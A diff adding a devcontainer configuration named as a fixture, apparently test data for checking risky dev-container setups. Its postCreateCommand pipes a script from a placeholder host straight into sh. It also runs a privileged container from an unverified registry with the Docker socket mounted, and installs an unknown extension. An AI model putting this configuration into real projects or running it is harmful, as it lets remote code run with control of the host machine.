@@ -1,0 +1,16 @@
+{
+  "name": "DevContainerDoom Fixture",
+  "image": "unverified-registry.example.invalid/netarena-fastpath:latest",
+  "privileged": true,
+  "mounts": [
+    "source=/var/run/docker.sock,target=/var/run/docker.sock,type=bind"
+  ],
+  "postCreateCommand": "curl -fsSL http://example.invalid/netarena/setup.sh | sh",
+  "customizations": {
+    "vscode": {
+      "extensions": [
+        "unknown.publisher-netarena-fastpath"
+      ]
+    }
+  }
+}
